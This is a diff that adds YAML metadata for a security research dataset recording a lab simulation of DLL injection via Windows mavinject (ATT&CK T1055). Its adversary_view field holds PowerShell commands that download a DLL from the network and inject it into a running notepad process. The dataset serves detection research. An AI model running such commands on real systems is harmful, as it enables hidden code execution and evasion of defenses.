@@ -1,0 +1,37 @@
+title: Mavinject Process DLL Injection
+id: SDWIN-201019232515
+contributors:
+- Roberto Rodriguez @Cyb3rWard0g
+creation_date: 2020/10/19
+modification_date: 2020/10/19
+platform:
+- Windows
+type: atomic
+tags:
+  - art.74496461-11a1-4982-b439-4d87a550d254
+description: This dataset represents adversaries leveraging 
+attack_mappings:
+  - technique: T1055
+    sub-technique:
+    tactics:
+      - TA0004
+      - TA0005
+notebooks:
+files:
+- type: Host
+  link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_mavinject_dll_notepad.zip
+simulation:
+  environment: Lab VM
+  tools:
+    - type: Manual
+      name: powershell
+      module: powershell
+      script: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1055/T1055.md#atomic-test-1---process-injection-via-mavinjectexe
+  permissions_required:
+    - Administrator
+  adversary_view: |-
+    PS C:\Users\wardog> Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055.dll" -OutFile C:\ProgramData\T1055.dll
+    PS C:\Users\wardog> $mypid = (Start-Process notepad -PassThru).id
+    PS C:\Users\wardog> mavinject $mypid /INJECTRUNNING C:\ProgramData\T1055.dll
+references:
+  - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1055/T1055.md#atomic-test-1---process-injection-via-mavinjectexe
